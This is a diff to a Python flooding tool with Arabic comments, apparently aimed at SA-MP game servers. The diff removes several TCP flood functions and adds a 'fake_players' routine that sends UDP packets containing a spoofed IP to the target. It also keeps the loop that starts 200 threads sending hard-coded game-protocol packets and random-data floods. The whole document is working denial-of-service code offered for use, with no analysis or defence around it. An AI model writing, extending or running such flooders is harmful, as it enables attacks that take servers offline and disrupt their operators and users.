@@ -43,7 +43,7 @@ times = int(input("Packet:"))
 threads = int(input("Threads:"))
 fake_ip = '182.21.20.32'
 
-# تعريف المتغير Pacotes بشكل صحيح
+# إعداد الحزم
 Pacotes = [
     codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
     codecs.decode("53414d509538e1a9611e63", "hex_codec"),
@@ -56,7 +56,18 @@ Pacotes = [
     codecs.decode("081e7eda", "hex_codec")
 ]
 
-# الدوال المختلفة للهجوم
+# دالة لزيادة عدد اللاعبين الوهميين
+def fake_players():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip), int(port))
+            s.sendto(fake_ip.encode(), addr)
+            print("[ANONYMOUS] Adding Fake Player!")
+        except:
+            print("[ANONYMOUS] Error adding Fake Player")
+
+# دوال الهجمات المختلفة
 def run():
     data = random._urandom(1460)
     while True:
@@ -69,94 +80,32 @@ def run():
         except:
             print("[ANONYMOUS] STRIKES BACK!")
 
-def run2():
-    data = random._urandom(1204)
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
-        except:
-            s.close()
-            print("[ANONYMOUS] STRIKES BACK!")
-
-def run3():
-    data = random._urandom(999)
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
-        except:
-            s.close()
-            print("[ANONYMOUS] ynikom!")
-
-def run4():
-    data = random._urandom(818)
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
-        except:
-            s.close()
-            print("[ANONYMOUS] is back!")
-
-def run5():
-    data = random._urandom(16)
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
-        except:
-            s.close()
-            print("[ANONYMOUS] Anonaymous ynikom!")
-
-# تعريف الكلاس MyThread بشكل صحيح
+# دالة لتشغيل الخيوط
 class MyThread(threading.Thread):
     def run(self):
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            msg = Pacotes[random.randrange(0, 5)]  # استخدام Pacotes بشكل صحيح
+            msg = Pacotes[random.randrange(0, 5)]
             sock.sendto(msg, (ip, int(port)))
-            if int(port) == 7777:
-                sock.sendto(Pacotes[5], (ip, int(port)))
-            elif int(port) == 7796:
-                sock.sendto(Pacotes[4], (ip, int(port)))
-            elif int(port) == 7771:
-                sock.sendto(Pacotes[6], (ip, int(port)))
-            elif int(port) == 7784:
-                sock.sendto(Pacotes[7], (ip, int(port)))
 
-# تشغيل الخيوط
 if __name__ == '__main__':
     try:
+        # بدء الخيوط الخاصة باللاعبين الوهميين إذا تم اختيارها
+        fake_choice = input("هل تريد إضافة لاعبين وهميين؟ (y/n): ")
+        if fake_choice.lower() == "y":
+            for _ in range(threads):
+                threading.Thread(target=fake_players).start()
+        
+        # بدء الهجمات بناءً على الخيارات المحددة
         for x in range(200):
             mythread = MyThread()
             mythread.start()
             time.sleep(0.1)
+
+        for y in range(threads):
+            if choice == 'y':
+                threading.Thread(target=run).start()
+            else:
+                threading.Thread(target=run).start()
     except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear')
-
-# تشغيل الهجمات بناءً على الاختيار
-for y in range(threads):
-    if choice == 'y':
-        threading.Thread(target=run).start()
-        threading.Thread(target=run2).start()
-        threading.Thread(target=run3).start()
-        threading.Thread(target=run4).start()
-    else:
-        threading.Thread(target=run5).start()
